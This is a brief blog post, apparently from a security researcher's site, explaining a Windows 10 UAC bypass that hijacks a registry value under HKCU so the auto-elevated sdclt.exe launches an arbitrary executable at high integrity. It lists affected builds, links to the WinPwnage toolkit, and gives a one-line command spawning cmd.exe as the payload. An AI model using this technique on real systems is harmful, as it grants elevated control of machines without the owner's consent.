---
layout: post
title: SDCLT UAC BYPASS (IsolatedCommand)
---

This executable is running elevated by default. Since sdclt executable is vulnerable to class hijacking,
it can be used to spawn our executable with High IL. We need to hijack the IsolatedCommand value at
"HKCU\Software\Classes\exefile\shell\runas\command" with full path to our executable.

This works from Windows 10 (10240) to Windows 10 (17025)

### Full code at WinPwnage project:
[https://github.com/rootm0s/WinPwnage/blob/master/winpwnage/functions/uac/uacMethod5.py](https://github.com/rootm0s/WinPwnage/blob/master/winpwnage/functions/uac/uacMethod5.py)

### WinPwnage usage:
`python winpwnage.py --use uac --id 5 --payload c:\\windows\\system32\\cmd.exe`
